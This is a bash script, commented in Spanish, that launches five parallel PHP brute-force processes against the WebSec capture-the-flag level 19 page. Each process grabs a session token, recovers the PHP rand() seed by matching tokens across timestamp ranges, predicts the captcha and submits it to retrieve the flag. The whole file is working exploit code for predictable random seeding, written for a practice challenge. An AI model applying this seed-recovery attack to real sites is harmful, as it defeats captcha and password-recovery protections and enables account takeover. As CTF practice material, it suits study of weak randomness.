#!/bin/bash

# Ultra massive attack - lanza múltiples instancias de búsqueda

echo "╔════════════════════════════════════════════════════════════╗"
echo "║    ULTRA MASSIVE PARALLEL ATTACK                           ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""

cd /workspace/websec_level19

# Lanzar 5 instancias más del massive bruteforce con diferentes rangos
for i in {1..5}; do
    php -r "
    error_reporting(0);
    
    function generate_random_text(\$length) {
        \$chars = 'abcdefghijklmnopqrstuvwxyz';
        \$chars .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        \$chars .= '1234567890';
        \$text = '';
        for(\$i = 0; \$i < \$length; \$i++) {
            \$text .= \$chars[rand() % strlen(\$chars)];
        }
        return \$text;
    }
    
    \$instance = $i;
    echo \"[Instance \$instance] Starting...\n\";
    
    while (true) {
        \$ch = curl_init('https://websec.fr/level19/index.php');
        curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt(\$ch, CURLOPT_HEADER, true);
        \$response = curl_exec(\$ch);
        curl_close(\$ch);
        
        if (!\$response) {
            sleep(1);
            continue;
        }
        
        if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', \$response, \$matches)) continue;
        \$session_id = \$matches[1];
        
        \$parts = explode(\"\r\n\r\n\", \$response, 2);
        \$body = isset(\$parts[1]) ? \$parts[1] : \$response;
        
        if (!preg_match('/name=\"token\" value=\"([^\"]+)\"/', \$body, \$token_match)) continue;
        \$real_token = \$token_match[1];
        
        \$current_time = time();
        
        // Cada instancia prueba un rango diferente
        \$offset_base = (\$instance - 1) * 100000;
        \$start_time = \$current_time - 500000 - \$offset_base;
        \$end_time = \$start_time + 100000;
        
        echo \"[Instance \$instance] Testing range: \$start_time to \$end_time | Token: \" . substr(\$real_token, 0, 8) . \"...\n\";
        
        for (\$seed = \$start_time; \$seed <= \$end_time; \$seed++) {
            srand(\$seed);
            \$test_token = generate_random_text(32);
            
            if (\$test_token === \$real_token) {
                echo \"\n[Instance \$instance] ✓✓✓ MATCH! Seed: \$seed ✓✓✓\n\";
                
                srand(\$seed);
                generate_random_text(32);
                \$captcha = generate_random_text(25);
                
                \$post_data = http_build_query([
                    'captcha' => \$captcha,
                    'token' => \$real_token,
                    'submit' => ''
                ]);
                
                \$ch = curl_init('https://websec.fr/level19/index.php');
                curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt(\$ch, CURLOPT_POST, true);
                curl_setopt(\$ch, CURLOPT_POSTFIELDS, \$post_data);
                curl_setopt(\$ch, CURLOPT_COOKIE, 'PHPSESSID=' . \$session_id);
                \$result = curl_exec(\$ch);
                curl_close(\$ch);
                
                if (strpos(\$result, 'Password recovery email sent') !== false) {
                    if (preg_match('/WEBSEC\{[^}]+\}/', \$result, \$flag_match)) {
                        echo \"FLAG: \" . \$flag_match[0] . \"\n\";
                        file_put_contents('/workspace/websec_level19/FLAG.txt', \$flag_match[0] . \"\n\");
                        exit(0);
                    }
                }
                break;
            }
        }
    }
    " > /tmp/ultra_$i.log 2>&1 &
    
    echo "Launched instance $i (PID: $!)"
    sleep 0.5
done

echo ""
echo "All instances launched. Monitoring FLAG.txt..."
echo ""

# Monitor el FLAG.txt
while true; do
    if [ -f FLAG.txt ]; then
        echo ""
        echo "════════════════════════════════════════════"
        echo "FLAG FOUND:"
        cat FLAG.txt
        echo "════════════════════════════════════════════"
        break
    fi
    sleep 2
done